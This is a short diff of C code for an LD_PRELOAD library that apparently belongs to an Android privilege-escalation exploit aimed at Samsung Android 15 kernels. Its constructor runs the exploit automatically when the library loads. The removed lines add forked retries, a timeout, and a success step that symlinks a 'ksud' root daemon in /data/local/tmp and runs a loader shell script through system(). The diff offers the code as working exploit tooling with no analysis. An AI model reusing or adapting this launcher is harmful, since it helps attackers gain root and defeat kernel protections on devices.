@@ -8,38 +8,6 @@ __attribute__((constructor)) static void load(void) {
   started = 1;
 
   unsetenv("LD_PRELOAD");
-  char *argv[] = {"preload.so", NULL};
-
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
-  for (int attempt = 1; attempt <= 24; attempt++) {
-    pid_t child = SYSCHK(fork());
-    if (child == 0) {
-      SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
-      if (getppid() == 1) _exit(1);
-      int result = run_exploit(1, argv);
-      if (result == 0) {
-        symlink("/data/local/tmp/ksud-samsung-android15-6.6-kdp",
-                "/data/local/tmp/ksud-selected");
-        system("sh /data/local/tmp/ksu-loader-selected.sh");
-      }
-      _exit(result);
-    }
-    int status;
-    time_t start = time(NULL);
-    while (waitpid(child, &status, WNOHANG) == 0) {
-      if (time(NULL) - start > 90) { kill(child, SIGKILL); break; }
-      usleep(100000);
-    }
-    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) return;
-    sleep(5);
-  }
-#else
   pr_success("minimal preload starting pid=%d\n", getpid());
-  int result = run_exploit(1, argv);
-  if (result == 0) {
-    symlink("/data/local/tmp/ksud-samsung-android15-6.6-kdp",
-            "/data/local/tmp/ksud-selected");
-    system("sh /data/local/tmp/ksu-loader-selected.sh");
-  }
-#endif
+  run_exploit(1, NULL);
 }
